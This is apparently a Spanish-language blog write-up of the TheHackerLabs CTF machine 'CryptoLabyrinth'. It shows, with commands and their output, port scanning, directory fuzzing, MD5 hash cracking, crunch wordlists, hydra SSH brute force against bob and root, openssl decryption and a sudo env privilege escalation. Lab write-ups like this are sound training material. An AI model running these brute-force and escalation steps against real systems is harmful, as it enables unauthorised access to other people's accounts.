---
title: "CryptoLabyrinth - TheHackerLabs"
date: 2025-06-23
draft: false
slug: "THL-writeup-cryptoLabyrinth"
excerpt: "Esta fue una máquina sencilla, pero que necesita bastante análisis. Después de analizar el escaneo, analizamos la página web activa en el puerto 80, donde encontramos un comentario en su código fuente. Al no encontrar algo más, aplicamos Fuzzing, descubriendo así un directorio oculto que contiene pistas, hashes y un archivo cifrado. Descargamos el directorio y analizamos los hashes, logrando crackear casi todos con la página Crackstation. El último hash lo logramos crackear creando un wordlist de la contraseña encontrada en el código fuente de la página web con crunch. Luego, utilizamos esa contraseña para ganar acceso a la máquina vía SSH como el usuario dueño de los hashes. A su vez, identificamos una clave para descifrar el archivo encriptado, esto dentro de un archivo de texto, logrando descifrarlo con openssl y obteniendo la contraseña del usuario dueño del archivo encriptado, pero dicha contraseña no funciona. Como el primer usuario encontrado, descubrimos que tiene privilegios para usar el binario env como otro usuario, logrando abusar de este para escalar privilegios y convertirnos en este segundo usuario. Como el segundo usuario, encontramos una contraseña a la que le faltan dos caracteres. Utilizamos crunch de nuevo para crear un wordlist y luego lo usamos para aplicar fuerza bruta al usuario Root vía SSH, encontrando así su contraseña y ganando acceso como Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Cryptography", "Web Enumeration", "Fuzzing", "Cracking Hash", "Brute Force Attack", "Cracking Cipher File", "Decrypting Encrypted File", "Abusing Sudoers Privilege", "User Pivoting", "Custom Wordlist Generation from a Found Password", "Privesc - Custom Wordlist Generation from a Found Password", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ffuf"
  - "gobuster"
  - "wget"
  - "cat"
  - "hash-identifier"
  - "Crackstation"
  - "crunch"
  - "JohnTheRipper"
  - "ssh"
  - "hydra"
  - "file"
  - "xxd"
  - "head"
  - "openssl"
  - "grep"
  - "sudo"
  - "env"
links:
  - "https://crackstation.net/"
  - "https://blog.ehcgroup.io/2019/01/09/15/29/15/4518/como-utilizar-crunch-una-guia-completa/hacking/ehacking/"
  - "https://kerkour.com/openssl-encrypt-decrypt-file"
  - "https://dl.acm.org/doi/fullHtml/10.5555/1145562.1145568"
  - "https://docs.openssl.org/1.0.2/man1/enc/"
  - "https://gtfobins.github.io/gtfobins/env/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-cryptoLabyrinth/cryptoLabyrinth.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.140
PING 192.168.10.140 (192.168.10.140) 56(84) bytes of data.
64 bytes from 192.168.10.140: icmp_seq=1 ttl=64 time=1.65 ms
64 bytes from 192.168.10.140: icmp_seq=2 ttl=64 time=1.28 ms
64 bytes from 192.168.10.140: icmp_seq=3 ttl=64 time=1.06 ms
64 bytes from 192.168.10.140: icmp_seq=4 ttl=64 time=0.951 ms

--- 192.168.10.140 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 0.951/1.233/1.648/0.267 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.140 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 10:27 CST
Initiating ARP Ping Scan at 10:27
Scanning 192.168.10.140 [1 port]
Completed ARP Ping Scan at 10:27, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:27
Scanning 192.168.10.140 [65535 ports]
Discovered open port 80/tcp on 192.168.10.140
Discovered open port 22/tcp on 192.168.10.140
Completed SYN Stealth Scan at 10:27, 6.94s elapsed (65535 total ports)
Nmap scan report for 192.168.10.140
Host is up, received arp-response (0.00087s latency).
Scanned at 2025-06-23 10:27:20 CST for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 2 puertos abiertos y supongo que la intrusión será por la página web del **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -P 22,80 192.168.10.140 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 10:27 CST
Failed to resolve "22,80".
Nmap scan report for 192.168.10.140
Host is up (0.00084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))

|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo muestra que la página web es la página por defecto de **Apache2**.

Quizá encontremos algo oculto por ahí, así que vamos a investigar.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura1.png">
</p>

Sí, solamente es la página por defecto de **Apache2**.

Pero si revisamos el código fuente, encontraremos un comentario al final:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura2.png">
</p>

Puede que sea una contraseña o algo parecido, pero podemos ver que faltan 2 caracteres al final.

De ahí en fuera, no hay nada más.

Vamos a aplicar **Fuzzing** para ver si hay algún directorio oculto.

### Fuzzing {#fuzz}

Primero usaremos **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.140/FUZZ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.140/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

hidden                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 234ms]
                        [Status: 200, Size: 10736, Words: 3435, Lines: 372, Duration: 53ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 10ms]
:: Progress: [220545/220545] :: Job [1/1] :: 269 req/sec :: Duration: [0:01:35] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.140/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.140/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 317] [--> http://192.168.10.140/hidden/]
/server-status        (Status: 403) [Size: 279]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Encontramos un directorio oculto, veamos su contenido:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura3.png">
</p>

Hay bastantes archivos, por lo que tendremos que analizar cada uno.

### Analizando Archivos de Directorio hidden {#hidden}

Entre los archivos, podemos ver un archivo encriptado llamado **alice_aes.enc** y varios archivos que son hashes del **usuario bob**. Además, hay varios archivos de texto que, supongo, son pistas.

Vamos a descargar todos los archivos de este directorio con **wget**:
```bash
mkdir hidden
cd hidden
wget -r -np -nH --cut-dirs=1 --reject "index.html*" http://192.168.10.140/hidden/
...
```

Ya tenemos todos los archivos:
```bash
ls -la
total 68
drwxr-xr-x 2 root root 4096 jun 23 13:42 .
drwxr-xr-x 3 root root 4096 jun 23 13:42 ..
-rw-r--r-- 1 root root   48 oct 17  2024 alice_aes.enc
-rw-r--r-- 1 root root   33 oct 22  2024 bob_password1.hash
-rw-r--r-- 1 root root   33 oct 22  2024 bob_password2.hash
-rw-r--r-- 1 root root   33 oct 22  2024 bob_password3.hash
-rw-r--r-- 1 root root   33 oct 22  2024 bob_password4.hash
-rw-r--r-- 1 root root   33 oct 22  2024 bob_password5.hash
-rw-r--r-- 1 root root   65 oct 17  2024 bob_salt_hash.txt
-rw-r--r-- 1 root root   17 oct 17  2024 bob_salt.txt
-rw-r--r-- 1 root root   60 oct 17  2024 clue_aes.txt
-rw-r--r-- 1 root root  103 oct 17  2024 clue_bob.txt
-rw-r--r-- 1 root root   56 oct 17  2024 datos_sensibles_alice.txt
-rw-r--r-- 1 root root   52 oct 17  2024 importante_pista_alice.txt
-rw-r--r-- 1 root root   49 oct 17  2024 informe_segur_bob.txt
-rw-r--r-- 1 root root  106 oct 17  2024 numeros_suerte.txt
-rw-r--r-- 1 root root   61 oct 17  2024 pista_aes.txt
```

Al leer los archivos de texto, solo los siguientes tienen pistas:
```bash
cat pista_aes.txt
Aquí comienza tu búsqueda. La clave AES está bien oculta.

cat numeros_suerte.txt
Importante: Los números de la suerte son 7, 14, 21. La clave para desencriptar Alice es supercomplexkey!

cat importante_pista_alice.txt
Pista crítica: La contraseña de Alice es cifrada.

cat clue_bob.txt
La clave privada de bob está fragmentada. ¡Reúne todas las partes para desencriptar su contraseña!

cat clue_aes.txt
Encuentra el hash para descifrar la contraseña de Alice...
```
En resumen, debemos desencriptar el archivo **alice_aes.enc** y crackear los hashes del **usuario bob**.

Analizando los hashes con **hash-identifier**, resulta que fueron creados con formato **MD5**:
```bash
--------------------------------------------------
 HASH: e10adc3949ba59abbe56e057f20f883e

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

--------------------------------------------------
 HASH: c378985d629e99a4e86213db0cd5e70d

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

--------------------------------------------------
 HASH: 0d107d09f5bbe40cade3de5c71e9e9b7

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

--------------------------------------------------
 HASH: d8578edf8458ce06fbc5bb76a58c5ca4

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

--------------------------------------------------
 HASH: 93ad6b16ba90629960e76a2c718ff4a5

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
Podríamos intentar crackearlos con la página web **crackstation**, lo haremos más adelante.

Por último, hay dos archivos de texto que contienen un **salt** y el **hash del salt** para el **usuario bob**:
```bash
--------------------------------------------------
 HASH: d5882bc2e9ca61f9

Possible Hashs:
[+] MySQL
[+] MD5(Middle)

--------------------------------------------------
 HASH: 6f9f059ee11b1c409d403e0c72bd4929546987afca3530b3c8975f513b3e15a2

Possible Hashs:
[+] SHA-256
[+] Haval-256
```
Aunque, no creo que los vayamos a ocupar, tomémoslos en cuenta por sí las dudas.

Faltaría analizar el archivo encriptado, pero lo haremos más adelante.

## Explotación de Vulnerabilidades {#Explotacion}

### Crackeando Hashes del Usuario Bob y Encontrando su Contraseña {#hashesBob}

Intentemos crackear estos hashes con la página **crackstation**:
* <a href="https://crackstation.net/" target="_blank">Crackstation</a>

Observa los resultados.

Hash del archivo **bob_password1.hash**:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura4.png">
</p>

Hash del archivo **bob_password2.hash**:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura5.png">
</p>

Hash del archivo **bob_password3.hash**:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura6.png">
</p>

Hash del archivo **bob_password4.hash**:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura7.png">
</p>

Hash del archivo **bob_password5.hash**:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura8.png">
</p>

Obtuvimos los siguientes resultados:
```bash
bob_password1.hash => e10adc3949ba59abbe56e057f20f883e => 123456
bob_password2.hash => c378985d629e99a4e86213db0cd5e70d => chocolate
bob_password3.hash => 0d107d09f5bbe40cade3de5c71e9e9b7 => letmein
bob_password4.hash => d8578edf8458ce06fbc5bb76a58c5ca4 => qwerty
bob_password5.hash => 93ad6b16ba90629960e76a2c718ff4a5 => Fallo al crackear
```
Algo me dice que el último hash debe contener algo, pues no se pudo crackear con **crackstation**.

Tratando de crackearlo con **JohnTheRipper** no dará ningún resultado, y al intentar usar el **salt** que encontramos tampoco va a funcionar.

Pero si recordamos, al principio encontramos una clave oculta en el código fuente de la página web activa.

El problema es que le faltan 2 caracteres, por lo que debemos crear un wordlist que los rellene y eso lo podemos hacer con la herramienta **crunch**:
```bash
crunch 11 11 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t 2LWxmDsW0@@ -o wordlist.txt
Crunch will now generate the following amount of data: 46128 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 3844 

crunch: 100% completed generating output
```

E intentemos crackear ese hash faltante:
```bash
john -w:wordlist.txt bob_password5.hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
********      (?)     
1g 0:00:00:00 DONE (2025-06-23 13:53) 25.00g/s 43200p/s 43200c/s 43200C/s 2LWxmDsW0zl..2LWxmDsW0Ct
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Funcionó.

Probemos si de casualidad es la contraseña del **usuario bob**:
```bash
ssh bob@192.168.10.140
bob@192.168.10.140's password: 
Linux TheHackersLabs-CryptoLabyrinth 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
...
Last login: Mon Jun 23 21:04:14 2025
bob@TheHackersLabs-CryptoLabyrinth:~$ whoami
bob
```
Genial, estamos dentro.

También pudimos haber aplicado fuerza bruta al **servicio SSH** con ese wordlist:
```bash
hydra -l 'bob' -P wordlist.txt ssh://192.168.10.140 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-23 12:57:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 3721 login tries (l:1/p:3721), ~59 tries per task
[DATA] attacking ssh://192.168.10.140:22/
[STATUS] 474.00 tries/min, 474 tries in 00:01h, 3290 to do in 00:07h, 21 active
[STATUS] 296.67 tries/min, 890 tries in 00:03h, 2883 to do in 00:10h, 12 active
[22][ssh] host: 192.168.10.140   login: bob   password: ********
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 11 final worker threads did not complete until end.
[ERROR] 11 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-23 13:03:57
```

### Desencriptando Archivo alice_aes.enc con OpenSSL {#desencriptado}

Primero, veamos qué información obtenemos con el comando **file**:
```bash
file alice_aes.enc
alice_aes.enc: openssl enc'd data with salted password
```
Es un archivo encriptado con **openssl** y se utilizó un **salt** con la contraseña.

Para poder desencriptar el archivo encriptado **alice_aes.enc**, necesitamos el algoritmo de cifrado, el archivo cifrado, la clave usada en el cifrado y probar si se usó la **derivación segura PBKDF2**.

Como tal, no hay una manera de saber qué algoritmo de cifrado fue usado, solamente podemos comprobar que el archivo fue cifrado con el comando **xxd** y **head**:
```bash
xxd alice_aes.enc | head
00000000: 5361 6c74 6564 5f5f 81de 5864 0ccb eb4b  Salted__..Xd...K
... 
```
Ahí se ve la frase `Salted__` que indica que el archivo fue cifrado y que, posiblemente, contiene un **salt**.

Hay muchos algoritmos de cifrado, pero hay uno que es el predeterminado, siendo el cifrado **aes-256-cbc**.

Ya tenemos la clave, que se incluyó en uno de los archivos de texto:
```bash
cat numeros_suerte.txt
Importante: Los números de la suerte son 7, 14, 21. La clave para desencriptar Alice es supercomplexkey!
```
Sería **supercomplexkey!**.

Aquí hay un blog que enseña cómo cifrar y descifrar archivos con **openssl**:
* <a href="https://kerkour.com/openssl-encrypt-decrypt-file" target="_blank">How to use OpenSSL to encrypt/decrypt files</a>

Intentemos descifrar ese archivo con la herramienta **openssl**:
```bash
openssl enc -d -aes-256-cbc -salt -pbkdf2 -in alice_aes.enc -k 'supercomplexkey!' -out alice_cont.txt
```

| Parámetros | Descripción |
|---|---|
| *-d*       | Eligiendo modo de descifrado. |
| *-aes-256-cbc* | Especificando algoritmo de cifrado. |
| *-salt* | Indica que se usó una sal (salt) para derivar la clave y el IV (vector de inicialización). |
| *-pbkdf2* | Utilizando el método PBKDF2 para derivar la clave desde la contraseña. |
| *-in* | Indicando archivo cifrado. |
| *-k* | Especificando la contraseña usada para derivar la clave simétrica y el IV. | 
| *-out* | Eligiendo archivo de salida. |

Se creó el archivo, veamos qué obtuvimos:
```bash
cat alice_cont.txt
superSecurePassword!
```

Parece ser la contraseña del **usuario alice**, pero al probarla para entrar al **servicio SSH**, no funcionará:
```bash
ssh alice@192.168.10.140
alice@192.168.10.140's password: 
Permission denied, please try again.
```
Entonces, continuemos con el **usuario bob**.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima y Abusando de Privilegios para Convertirnos en Usuario alice {#linEnum}

Veamos qué usuarios existen:
```bash
bob@TheHackersLabs-CryptoLabyrinth:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
alice:x:1002:1002:,,,:/home/alice:/bin/bash
```
Ahí está el **usuario alice** y existe el **usuario debian**.

Pero no podremos ver el contenido de sus directorios:
```bash
bob@TheHackersLabs-CryptoLabyrinth:~$ ls -la /home
total 20
drwxr-xr-x  5 root   root   4096 oct 16  2024 .
drwxr-xr-x 18 root   root   4096 oct 17  2024 ..
drwx------  2 alice  alice  4096 oct 17  2024 alice
drwx------  2 bob    bob    4096 oct 17  2024 bob
drwx------  2 debian debian 4096 oct 16  2024 debian
```

Veamos qué archivos tiene este usuario:
```bash
bob@TheHackersLabs-CryptoLabyrinth:~$ ls -la
total 28
drwx------ 2 bob  bob  4096 oct 17  2024 .
drwxr-xr-x 5 root root 4096 oct 16  2024 ..
-rw------- 1 bob  bob   643 oct 23  2024 .bash_history
-rw-r--r-- 1 bob  bob   220 oct 16  2024 .bash_logout
-rw-r--r-- 1 bob  bob  3526 oct 16  2024 .bashrc
-rw-r--r-- 1 bob  bob   807 oct 16  2024 .profile
-rw-r--r-- 1 root root   24 oct 17  2024 users.txt
```
Podemos ver una flag, pero no parece ser del formato usual. Aun así, vamos a guardarla.

También podemos ver que el **historial de Bash** no se vacía, por lo que podemos verlo:
```bash
bob@TheHackersLabs-CryptoLabyrinth:~$ cat .bash_history 
...
echo -n "2LWx*DsW0A*" | mkpasswd --method=bcrypt --rounds=12 > /var/www/html/hidden/bob_password4.hash
...
sudo -u alice /usr/bin/env /bin/sh
...
cd /tmp/.secreto.txt
cat /tmp/.secreto.txt
...
cat /opt/.secreto.txt
...
cd /mnt
cat .secreto.txt
...
```
Hay algunos comandos que son pistas de lo que tenemos que hacer.

Podemos ver que se usó un comando que genera un **hash bcrypt** de una clave/contraseña `2LWx*DsW0A*` con costo de 12 iteraciones (a la clave/contraseña le faltan dos caracteres), y lo guarda en un archivo **.hash** que está expuesto en el servidor web como **bob_password4.hash**.

Lo que es extraño, porque ya desciframos ese archivo y obtuvimos un resultado distinto.

Hay un archivo llamado **.secreto.txt**, que parece existir en varios directorios, pero revisando los directorios mencionados, no encontraremos algo en dicho archivo.

Salvo el directorio `/mnt`, donde ahí lo encontraremos, pero no podremos verlo:
```bash
bob@TheHackersLabs-CryptoLabyrinth:~$ ls -la /mnt
total 12
drwxr-xr-x  2 root  root  4096 oct 23  2024 .
drwxr-xr-x 18 root  root  4096 oct 17  2024 ..
-rw-------  1 alice alice   12 oct 21  2024 .secreto.txt
bob@TheHackersLabs-CryptoLabyrinth:~$ cat /mnt/.secreto.txt 
cat: /mnt/.secreto.txt: Permiso denegado
```

Por último, vemos que se utilizó el comando **env**, que utiliza privilegios del **usuario alice** y que parece dar una sesión **sh**.

Eso quiere decir que nuestro usuario tiene privilegios para usar el comando **env**:
```bash
bob@TheHackersLabs-CryptoLabyrinth:~$ sudo -l
Matching Defaults entries for bob on TheHackersLabs-CryptoLabyrinth:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bob may run the following commands on TheHackersLabs-CryptoLabyrinth:
    (alice) NOPASSWD: /usr/bin/env
```

Busquemos en la **guía de GTFOBins** una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/env/" target="_blank">GTFOBins: env</a>

Utilizaremos el mismo comando que fue usado y que se menciona aquí:

<p align="center">
<img src="/assets/images/THL-writeup-cryptoLabyrinth/Captura9.png">
</p>

Probemos:
```bash
bob@TheHackersLabs-CryptoLabyrinth:~$ sudo -u alice /usr/bin/env /bin/bash
alice@TheHackersLabs-CryptoLabyrinth:/home/bob$ whoami
alice
```
Muy bien, somos el **usuario alice**.

### Creando Wordlist de Posible Contraseña y Aplicando Fuerza Bruta al Usuario Root {#root}

Como este usuario, no podremos ver sus privilegios porque no tenemos su contraseña:
```bash
alice@TheHackersLabs-CryptoLabyrinth:/home/bob$ sudo -l
[sudo] contraseña para alice: 
Lo siento, pruebe otra vez.
```

Aquí encontraremos otra flag:
```bash
alice@TheHackersLabs-CryptoLabyrinth:/home/bob$ cd ../alice/
alice@TheHackersLabs-CryptoLabyrinth:~$ ls
user.txt
alice@TheHackersLabs-CryptoLabyrinth:~$ cat user.txt
...
```

Ahora podemos ver el archivo **.secreto.txt** del directorio `/mnt`:
```bash
alice@TheHackersLabs-CryptoLabyrinth:~$ cat /mnt/.secreto.txt 
2LWx*DsW0A*
```
Es la clave/contraseña que vimos en el historial del **usuario bob**.

Quizá sea la contraseña para el **usuario alice**, pero recuerda que le faltan 2 caracteres.

Tendremos que crear otro wordlist con **crunch**:
```bash
crunch 11 11 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t 2LWx@DsW0A@ -o wordlist2.txt
Crunch will now generate the following amount of data: 46128 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 3844 

crunch: 100% completed generating output
```

Y vamos a aplicarle fuerza bruta al **Root**, porque este wordlist no sirvió contra el **usuario alice**:
```bash
hydra -l 'root' -P wordlist2.txt ssh://192.168.10.140 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-23 13:32:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 3844 login tries (l:1/p:3844), ~61 tries per task
[DATA] attacking ssh://192.168.10.140:22/
[STATUS] 558.00 tries/min, 558 tries in 00:01h, 3328 to do in 00:06h, 22 active
[STATUS] 386.67 tries/min, 1160 tries in 00:03h, 2731 to do in 00:08h, 17 active
[STATUS] 311.00 tries/min, 2177 tries in 00:07h, 1716 to do in 00:06h, 15 active
[STATUS] 285.58 tries/min, 3427 tries in 00:12h, 466 to do in 00:02h, 15 active
[STATUS] 282.92 tries/min, 3678 tries in 00:13h, 215 to do in 00:01h, 15 active
[22][ssh] host: 192.168.10.140   login: root   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 12 final worker threads did not complete until end.
[ERROR] 12 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-23 13:46:22
```
Funcionó, tenemos la contraseña del **Root**.

Autentiquémonos vía **SSH**:
```bash
ssh root@192.168.10.140
root@192.168.10.140's password: 
Linux TheHackersLabs-CryptoLabyrinth 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
...
Last login: Tue Oct 22 19:09:39 2024
root@TheHackersLabs-CryptoLabyrinth:~# whoami
root
```

Obtengamos la última flag:
```bash
root@TheHackersLabs-CryptoLabyrinth:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
